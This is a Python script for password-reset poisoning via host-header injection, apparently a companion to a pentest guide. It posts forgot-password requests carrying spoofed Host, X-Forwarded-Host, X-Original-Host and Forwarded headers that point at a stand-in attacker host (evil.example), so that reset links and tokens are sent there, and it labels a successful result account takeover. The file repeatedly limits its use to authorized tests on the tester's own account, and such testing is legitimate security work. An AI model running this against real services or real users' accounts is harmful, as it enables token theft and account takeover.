#!/usr/bin/env python3
"""
reset_poison.py — password-reset poisoning helper (HOST_HEADER_INJECTION_TESTING_GUIDE.md §11).
Triggers a password-reset for YOUR OWN account with a spoofed host, across the spoofing-header set.
You then check YOUR mailbox: if the reset link points to the spoofed host, poisoning is confirmed (ATO).

AUTHORIZED testing, OWN account only. Never trigger resets for accounts you don't control.

Usage:
  python3 reset_poison.py -u https://target/api/forgot-password -e you@yourdomain.com --evil evil.yourdomain.com
  python3 reset_poison.py -u https://target/forgot -e you@yourdomain.com --field email --evil evil.example
"""
import argparse, json, sys
try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="the forgot-password endpoint")
    ap.add_argument("-e", "--email", required=True, help="YOUR OWN test account email")
    ap.add_argument("--evil", default="evil.example", help="host you control to receive the token")
    ap.add_argument("--field", default="email", help="JSON/form field name for the email")
    ap.add_argument("--form", action="store_true", help="send as form-encoded instead of JSON")
    ap.add_argument("--timeout", type=float, default=15)
    a = ap.parse_args()

    spoofs = [
        {"Host": a.evil},
        {"X-Forwarded-Host": a.evil},
        {"X-Host": a.evil},
        {"X-Forwarded-Host": a.evil, "X-Forwarded-Server": a.evil},
        {"X-Original-Host": a.evil},
        {"Forwarded": f"host={a.evil}"},
    ]
    print(f"[*] Triggering reset for {a.email} (YOUR account) with spoofed hosts -> {a.evil}")
    print(f"[*] After each, CHECK YOUR MAILBOX: a link to https://{a.evil}/... = poisoning confirmed (ATO).\n")

    for i, sp in enumerate(spoofs, 1):
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type":
                   "application/x-www-form-urlencoded" if a.form else "application/json"}
        headers.update(sp)
        body = (f"{a.field}={a.email}" if a.form else json.dumps({a.field: a.email}))
        try:
            r = requests.post(a.url, data=body, headers=headers, timeout=a.timeout, verify=False)
            label = ", ".join(f"{k}:{v}" for k, v in sp.items())
            print(f"  [{i}] sent ({label}) -> HTTP {r.status_code}")
        except Exception as e:
            print(f"  [{i}] error: {e}")

    print(f"\n[!] Now read {a.email}'s inbox. If the reset link host == {a.evil} (or any spoof), it's reset-poisoning")
    print("    -> ACCOUNT TAKEOVER. Capture the email + the token arriving at your host. Report (§11/§19).")
    print("[!] OWN ACCOUNT ONLY. Do not trigger resets for real users.")

if __name__ == "__main__":
    main()
